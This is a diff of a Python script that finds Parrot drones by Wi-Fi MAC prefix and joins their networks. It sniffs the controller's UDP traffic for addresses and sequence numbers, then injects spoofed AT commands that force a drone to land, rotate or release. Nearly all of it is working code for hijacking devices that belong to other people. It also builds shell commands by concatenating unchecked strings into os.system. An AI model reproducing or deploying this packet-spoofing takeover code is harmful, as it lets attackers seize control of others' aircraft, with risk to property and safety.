@@ -5,6 +5,7 @@ from wifi import Cell, Scheme
 from time import sleep
 import serial
 import re
+import os
 
 def readConfig(): #TODO implement it - it reads the config file and returns the whitelist of drones (string array of MAC addresses) and other config data (not used yet)
 	return ("", "")
@@ -42,7 +43,7 @@ def scanForParrots(interface, whitelist, underattack):
 	aps = Cell.all(interface)
 	parrots = []
 	for ap in aps:
-		if ap.address.startswith('90:03:B7') or ap.address.startswith('58:44:98:13:80'): #if it is a parrot OR my phone (for testing)
+		if ap.address.startswith('90:03:B7') or ap.address.startswith('00:26:7E') or ap.address.startswith('A0:14:3D') or ap.address.startswith('00:12:1C') or ap.address.startswith('58:44:98:13:80'): #if it is a parrot OR my phone (for testing)
 			if ap.address not in whitelist and ap.address not in underattack: #only add if new and not on the whitelist
 				print "New parrot wifi found:", ap.ssid
 				parrots.append(ap)
@@ -58,13 +59,25 @@ def connectTo(ap, interface):
 	except Exception as detail:
 		print "Error while trying to connect to wifi in function connectTo - ", detail
 		return False
+	#reset global variables for sniffing
+	global srcMAC, dstMAC, srcIP, dstIP, seqNr
+	srcMAC = ""
+	dstMAC = ""
+	srcIP = ""
+	dstIP = ""
+	seqNr = ""
 
-def getWifiStrength(interface):
+def getWifiDistance(interface, ap):
 	aps = Cell.all(interface) #aps first element is always the one we are connected to right now
-	return aps[0].signal #a negative number, closer to 0 - closer the AP
+	if(aps[0].address != ap.address): #if we are no longer connected to the given wifi, exit
+		return 0
+	return -1* aps[0].signal #originally a negative number, closer to 0 - closer the AP
 
 def disconnectFromWifi(interface):
-	#apparently python's wifi module can not disconnect from a network
+	#apparently python's wifi module can not disconnect from a network, so we have to do it with os commands
+	os.system("ifconfig " + interface + " down")
+	sleep(0.5)
+	os.system("ifconfig " + interface + " up")
 	return True
 
 def getAPsMAC(aps):
@@ -79,7 +92,8 @@ srcIP = ""
 dstIP = ""
 seqNr = ""
 def sniffParrotCommunication(interface):
-	sniff(iface=interface, prn=pkt_callback, filter="udp and port 5556", count = 10, timeout = 1)
+	sniff(iface=interface, prn=pkt_callback, filter="udp and port 5556", timeout = 3) #count = 10, 
+	global srcMAC, dstMAC, srcIP, dstIP, seqNr
 	return (srcMAC, dstMAC, srcIP, dstIP, seqNr)
 
 def pkt_callback(pkt):
@@ -95,7 +109,7 @@ def pkt_callback(pkt):
 		m = p.search(pkt[Raw].load)
 		seqNr = int(m.group(1))
 
-def sendSpoofedParrotPacket(command, interface, srcMAC, dstMAC, srcIP, dstIP, seqNR, count): #TODO test warn
+def sendSpoofedParrotPacket(command, interface, srcMAC, dstMAC, srcIP, dstIP, seqNr, count): #TODO test warn
 	part1 = ""
 	part2 = ""
 	if command == "land":
@@ -106,14 +120,14 @@ def sendSpoofedParrotPacket(command, interface, srcMAC, dstMAC, srcIP, dstIP, se
 		part2 = "0,0,0,0,0,0,0"
 	elif command == "warn": #slowly rotate
 		part1 = "PCMD_MAG"
-		part2 = "1,0,0,0,0,0,0.1" #last value is the angular speed [-1,1]
+		part2 = "0,0,0,0,-50000000,0,0" #"1,0,0,0,1" #last value is the angular speed [-1,1] -1082130432
 	elif command == "release":
 		part1 = "PCMD_MAG"
 		part2 = "0,0,0,0,0,0,0"
 		seqNr = -1000000 #so it will be 1 in the end
 		count = 1
 	
-	for i in range(1, count):
+	for i in range(1, count+1):
 		payload = "AT*" + part1 + "=" + str(seqNr+i+1000000) + "," + part2 + "\r"
 		print payload
 		spoofed_packet = Ether(src=srcMAC, dst=dstMAC) / IP(src=srcIP, dst=dstIP) / UDP(sport=5556, dport=5556) / payload
